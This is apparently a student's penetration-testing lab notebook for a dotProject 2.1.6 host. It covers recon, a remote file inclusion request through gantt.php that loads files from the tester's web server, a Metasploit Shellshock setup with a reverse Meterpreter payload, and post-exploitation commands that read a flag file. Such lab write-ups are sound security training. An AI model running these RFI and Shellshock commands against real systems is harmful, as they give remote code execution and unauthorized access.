**Navigation:** [Work index](../README.md) · [Attack plan](./attack_plan/README.md) · [Credential pivot (hub)](../credential_pivot_A_Rocha_hosts.md) · [Creds — this host](./credential_pivot.md) · [Dead ends](./unfruitful_attempts/README.md) · [A_Rocha README](../../README.md)

---

## `10.20.160.102` — Linux / dotProject 2.1.6 (validated)

| Field | Value |
|-------|--------|
| **Role** | Primary **web** target — **Apache 2.2.21**, **PHP 5.3.8**, **LAMPP** path **`/opt/lampp/htdocs/`** (from PHP notice) |
| **App** | **dotProject 2.1.6** — **`/dotproject/`** (root **302/301** to this path) |
| **Confirmed primitives** | **RFI** — **`/dotproject/modules/projectdesigner/gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/<file>?`** — body reflected **`RFI_MARKER_EPT`** / **`PROOF`** ([`102-004`](./Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)). **Shell** — **Metasploit** **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** (Shellshock / **CVE-2014-6271** class) → **Meterpreter** on **`.102`** — [`102-009`](./Screenshots/102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png): handler **`10.20.150.106:4444`**, **`sysinfo`** **CentOS 6.3** (kernel **2.6.32-279.el6.x86_64**), **`getuid`** **`no-user @ Elara`** (`uid=500`), **`shell`** + **`echo afrocha; date`** (**2026-04-25**). **User flag** — from **`meterpreter > shell`**: landed in **CGI** area (`printenv`, `test-cgi`), then **`cd ~`** → **`Desktop`** → **`cat local.txt`** — evidence [`102-010`](./Screenshots/102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png) (flag string **only** in that capture / your report; do not paste live flags into shared chat). |
| **Exploit-DB mapping** | **`searchsploit dotproject 2.1.6`** → **`php/webapps/22708.txt`** (**EDB-22708**, *Remote File Inclusion*) — full advisory text: [`102-008`](./Screenshots/102-008_searchsploit_x_22708_rfi_gantt_advisory_tm6_afrocha.png); command output: [`102-007`](./Screenshots/102-007_searchsploit_dotproject_2_1_6_edb22708_tm6_afrocha.png). Advisory notes **`allow_url_include`** / **`register_globals`**; lab stack still matched your **inclusion** PoC—cite **both** conditions in the report. |
| **OWASP ZAP (baseline)** | **Active scan:** **Parameter Tampering** on **`login`** at **`/dotproject/index.php`** (Medium — error-style output / **CWE-472**). **Passive + active:** **X-Frame-Options** missing (clickjacking), weak **cookie** flags, no **Anti-CSRF** on forms, **`X-Powered-By`** leak, **`X-Content-Type-Options`** missing, **timestamp** disclosures — see [`102-005`](./Screenshots/102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png), [`102-006`](./Screenshots/102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png). |

**Lanes that did not pan out (or were dead ends before a working config):** early **Shellshock** **`check`** on **`TARGETURI /cgi-bin/printenv`** was **not exploitable**, but a **full `run`** with the same module against a **vulnerable CGI `TARGETURI`** succeeded — see **[`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)** (section 1 update) and **§6** below. Also: **`msf > search dot`**, **`php_imap_open_rce`**, generic **PHP-CGI** catalogue noise, RFI **listener / path** mistakes — same folder.

**Plan shift after ZAP:** keep **RFI** and **Shellshock/MSF** as proven lanes for the report; add **time-boxed** manual follow-up on **`login`** (**SQLi** / **auth bypass** / **logic flaws**) using ZAP evidence as the map; treat **clickjacking** / **cookie** / **CSRF** items as **defense-in-depth** unless the rubric rewards chained client-side impact.

### Plan of attack — commands (current)

```bash
export RHOST_102=10.20.160.102
echo TM6_afrocha; date
ip -br a    # set LHOST / KALI_LAB_IP to the interface .102 can reach (e.g. 10.20.150.106)
```

**1 — Map services**

```bash
nmap -Pn -sS -sV -T4 "$RHOST_102" -oA ~/scans/nmap_102_initial
nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST_102"
```

**2 — Web entry + version fingerprint**

```bash
curl -sik "http://$RHOST_102/"
curl -sik "http://$RHOST_102/dotproject/"
curl -sik "http://$RHOST_102/dotproject/index.php"
```

**3 — Optional web scanners**

```bash
nikto -h "http://$RHOST_102"
```

**OWASP ZAP** (scope **`http://$RHOST_102/dotproject/`** — Quick Start / spider, then **active scan**; proxy listen e.g. **`localhost:8081`** if you avoid colliding with **`8080`** RFI PoC):

- Review **Alerts** — prioritize **Medium** **Parameter Tampering** on **`login`** (manual: **SQLi**, type juggling, auth bypass) before burning time on **Low** header-only rows.
- **X-Frame-Options** / **CSRF** / **cookie flags** — document for **remediation**; exploit only if course **ROE** rewards **session** impact and you have a **clear chain**.

**4 — Exploit-DB + RFI proof (lab-authorized)**

```bash
searchsploit dotproject 2.1.6
searchsploit -x php/webapps/22708.txt

export LHOST=<KALI_LAB_IP>
mkdir -p ~/rfi_poc
printf 'RFI_MARKER_EPT\n' > ~/rfi_poc/marker.txt
printf 'PROOF\n' > ~/rfi_poc/proof.txt
cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
```

New terminal:

```bash
export RHOST_102=10.20.160.102
export LHOST=<KALI_LAB_IP>

curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
curl -s "http://$LHOST:8080/proof.txt"
curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/proof.txt?"
```

Use **`http://`** to your listener (**not** `https://`). Keep all served files under **`~/rfi_poc/`** (same directory as **`http.server`**).

**5 — Post-ex (after shell or per rubric)**

```bash
hostname; whoami; id
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```

**6 — Shellshock → Meterpreter (`msfconsole`, 2026-04-25 win)**

Earlier, **`apache_mod_cgi_bash_env_exec`** with **`TARGETURI /cgi-bin/printenv`** returned **`check` → not exploitable** (still documented under [`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)). On a later run, **`run`** against **`.102`** with a **CGI path that actually executes via `mod_cgi`** (set **`TARGETURI`** accordingly — often **not** the same script as a quick **`printenv`** probe) opened **Meterpreter session 1** to handler **`10.20.150.106:4444`**.

```text
msfconsole -q
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.20.160.102
set RPORT 80
set TARGETURI /cgi-bin/<your-working-cgi>   # must be a bash-backed CGI; differs from failed /cgi-bin/printenv check
set LHOST 10.20.150.106
set LPORT 4444
set payload linux/x86/meterpreter/reverse_tcp
run
```

At **`meterpreter >`**: **`sysinfo`** (CentOS 6.3, **Elara** context), **`getuid`** (**`no-user @ Elara`**, `uid=500`), **`shell`**, then **`echo afrocha; date`** for an operator stamp, **`exit`** back to Meterpreter.

**Evidence:** [`102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png`](./Screenshots/102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png)

**7 — `local.txt` (user flag) from Meterpreter shell**

After **`meterpreter > shell`** (same session chain as **§6**), **`ls`** showed **`printenv`** / **`test-cgi`** (typical **web/CGI cwd**). Then:

```bash
cd ~
ls
cd Desktop
ls
cat local.txt
echo afrocha; date
```

**Evidence:** [`102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png`](./Screenshots/102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png)

### Evidence index (`./Screenshots/`)

| Topic | Files |
|-------|--------|
| nmap / http-enum | `recon_nmap_102_initial_tm6_afrocha.png`, `recon_nmap_102_http_enum_headers_tm6_afrocha.png` |
| curl root / dotproject | `recon_curl_root_302_dotproject_tm6_afrocha.png`, `recon_curl_dotproject_301_tm6_afrocha.png`, `recon_curl_dotproject_https_attempts_tm6_afrocha.png` |
| Version + login | `recon_curl_dotproject_index_php_200_meta_tm6_afrocha.png`, `recon_dotproject_login_html_2_1_6_tm6_afrocha.png` |
| Advisory | `searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png`, **`102-007_searchsploit_dotproject_2_1_6_edb22708_tm6_afrocha.png`**, **`102-008_searchsploit_x_22708_rfi_gantt_advisory_tm6_afrocha.png`** |
| Chronological **102-*** | `102-001` … `102-004` (RFI); **`102-005`**, **`102-006`** (ZAP); **`102-007`**, **`102-008`** (**EDB-22708** / `searchsploit -x`); **`102-009`** (Shellshock **`apache_mod_cgi_bash_env_exec`** → **Meterpreter**); **`102-010`** (**`local.txt`** on **`~/Desktop`**) |
| OWASP ZAP | `102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png` (Parameter Tampering **`login`**), `102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png` (headers / alert summary) |
| Nikto | `recon_nikto_102_http80_banner_redirect_tm6_afrocha.png`, `recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png` |
| MSF Shellshock / post-ex | `exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png` (**`check`** negative on **`printenv`**); **`102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png`** (**`run`** → **Meterpreter** + **`sysinfo` / `getuid` / `shell`**); **`102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png`** (**`~/Desktop/local.txt`**) |
| searchsploit menus | `searchsploit_apache_2_2_21_tm6_afrocha.png`, `searchsploit_php_5_3_8_*.png`, `searchsploit_dotproject_tm6_afrocha.png` |

Screenshot naming **`102-NNN_…`**: [A_Rocha README](../../README.md) + [`.cursor` rule](../../../.cursor/rules/ept-evidence-screenshots.mdc).

### Now what (`.102` — post-shell)

1. **Report / deck:** Chain **RFI** (**`102-004`**) + **EDB-22708** evidence (**`102-007` / `102-008`**) **and** **Shellshock Meterpreter** (**`102-009`**, **`102-010`**) with a one-line contrast: **`check`** on **`printenv`** failed, **`run`** succeeded once **`TARGETURI`** matched a **real `mod_cgi`** vector.  
2. **Priv / flags:** **`local.txt`** captured on **`~/Desktop`** (**`102-010`**). Still hunt **`proof.txt`** / other rubric paths if required. **`no-user`** is not **root** — note **priv-esc** only if the scenario demands it.  
3. **`login` lane:** Optional time-box on ZAP **`login`** (**SQLi** / auth) for extra findings.  
4. **Sheet + root README:** Mark **`.102` exploited** in the [Host discovery sheet](https://docs.google.com/spreadsheets/d/1J3H6ee8N06ROz1l4pcgxclArq5TN4sk3kIPbHPTCj3A/edit?usp=sharing) and [root `README.md`](../../../README.md) when the team owns the table row.

---
